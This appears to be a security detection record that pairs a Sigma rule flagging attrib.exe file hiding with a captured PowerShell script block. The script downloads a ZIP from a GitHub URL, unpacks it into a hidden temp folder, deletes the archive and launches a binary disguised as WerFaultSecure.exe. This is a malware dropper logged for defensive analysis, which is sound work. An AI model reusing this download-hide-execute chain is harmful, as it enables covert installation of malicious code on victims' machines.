sigma_analysis_results.rule_description: Detects usage of attrib.exe to hide files from users.
Detects usage of attrib.exe to hide files from users.

values.ScriptBlockText: $url = "https://github.com/nateeintanan2527/Joyce_Data/raw/main/DATA3.zip"; $dir = [System.Guid]::NewGuid().ToString(); (New-Object Net.WebClient).DownloadFile("$url", "$env:temp\$dir.zip"); New-Item -Path "$env:temp\$dir" -ItemType Directory; Expand-Archive -LiteralPath "$env:temp\$dir.zip" -DestinationPath $env:temp\$dir; attrib +h $env:temp\$dir; Remove-Item "$env:temp\$dir.zip"; Start-Sleep -Seconds 3; Set-Location -Path "$env:temp\$dir"; Start-Process .\WerFaultSecure.exe
